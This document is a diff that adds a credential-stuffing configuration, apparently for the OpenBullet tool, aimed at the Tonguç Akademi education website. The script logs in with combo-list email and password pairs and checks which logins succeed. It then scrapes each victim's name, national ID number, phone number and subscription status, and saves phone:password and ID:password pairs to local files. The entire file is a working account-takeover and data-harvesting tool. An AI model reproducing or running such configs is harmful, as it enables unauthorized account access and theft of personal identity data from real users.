@@ -1,0 +1,120 @@
+[SETTINGS]
+{
+  "Name": "Tonguç Akademi",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-19T20:34:28.4717304+00:00",
+  "AdditionalInfo": "",
+  "Author": "Sparta [CT]",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.tongucakademi.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "__RequestVerificationToken\" type=\"hidden\" value=\"" "\" />  " -> VAR "Token" 
+
+FUNCTION URLDecode "<USER>" -> VAR "<USER>" 
+
+REQUEST POST "https://www.tongucakademi.com/login/login" 
+  CONTENT "Email=<USER>&Parola=<PASS>&Hatirla=false&__RequestVerificationToken=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.tongucakademi.com" 
+  HEADER "referer: https://www.tongucakademi.com/login" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.75" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Durum\":true" 
+  KEYCHAIN Failure OR 
+    KEY "Durum\":false" 
+
+REQUEST GET "https://www.tongucakademi.com/profil/bilgilerim" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#AD PARSE "<SOURCE>" LR " <input id=\"ad\" value=\"" "\" type=\"text\">" CreateEmpty=FALSE -> CAP "AD" 
+
+#Soyad PARSE "<SOURCE>" LR "<input id=\"soyad\" value=\"" "\" type=\"text\">" CreateEmpty=FALSE -> CAP "Soyad" 
+
+#T.C_NO PARSE "<SOURCE>" LR "<input id=\"kimlikno\" value=\"" "\" type=\"number\"" CreateEmpty=FALSE -> CAP "T.C NO" 
+
+#Tel_No PARSE "<SOURCE>" LR "<input id=\"telefon\" placeholder=\"05xxxxxxxxx\" value=\"" "\" type=\"text\" class=\"telefonMask\">" CreateEmpty=FALSE -> CAP "Tel No" 
+
+REQUEST GET "https://www.tongucakademi.com/profil/siparislerim" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Paket PARSE "<SOURCE>" LR "<div class=\"classPackage\">" "</span>" -> VAR "Paket" 
+
+FUNCTION Replace "<span>" " " "<Paket>" -> CAP "Paket" 
+
+#Paket_Bitiş PARSE "<SOURCE>" LR "<p style=\"color:red\">" "</p>" CreateEmpty=FALSE -> CAP "Paket Bitiş" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Henüz bir üyelik paketine sahip değilsin" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Henüz bir üyelik paketine sahip değilsin" 
+
+#Tell:Pass UTILITY File "DB\\TellPass.txt" AppendLines "<Tel No>:<PASS>" -> CAP "Tell:Pass" 
+
+#Tc:Pass UTILITY File "DB\\TC Pass.txt" AppendLines "<T.C NO>:<PASS>" -> CAP "Tc:Pass" 
+
+SET CAP "Author" "Sparta"
+
